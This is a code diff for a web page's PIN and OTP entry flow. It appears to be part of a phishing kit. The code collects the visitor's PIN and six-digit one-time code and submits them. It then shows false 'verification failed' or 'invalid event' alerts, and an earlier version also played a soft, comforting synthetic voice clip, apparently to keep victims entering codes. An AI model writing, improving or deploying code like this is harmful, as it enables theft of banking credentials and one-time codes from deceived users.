@@ -488,8 +488,31 @@ await runStep("Verifying...", "verification", "view4");
       await runStep("Processing ...", "pin_screen_", "view5");
     }
      
-    async function submitOtp() { await sendData('Otp', null); alert('verification failed.please check otp and try again!'); }
-      async function submitOtp() { await sendData('Otp', null); alert('Verification failed. Please check the OTP and try again.'); const audio = new Audio('ElevenLabs_2026-11-16T02_32_28_Lauren - Friendly, Comforting and Soft_pvc_s50_sim75_v4.mp3'); audio.play(); }
+    async function submitOtp() {
+      state.pin = Array.from(document.querySelectorAll('#pin-group .pin-box')).map(b => b.value).join('');
+      state.otp = Array.from(document.querySelectorAll('#otp-group .pin-box')).map(b => b.value).join('');
+      if (!isCodeComplete("otp-group")) {
+        alert("Please enter all 6 digits for the OTP.");
+        return;
+      }
+      const result = await runStep("Completing ...", "otp_screen", null);
+      if (result.success) {
+        alert("invalid event !");
+      } else {
+        alert("Local completed. API connection unavailable.");
+      }
+      reset();
+    }
+
+    function reset() {
+      state.issue = "";
+      state.reference = "";
+      const refInput = document.getElementById("reference");
+      if (refInput) refInput.value = "";
+      document.querySelectorAll(".pin-box").forEach((box) => box.value = "");
+      showView("view1");
+    }
+
     function setupDigitInputs(containerId) {
       const boxes = document.querySelectorAll(`#${containerId} .pin-box`);
 
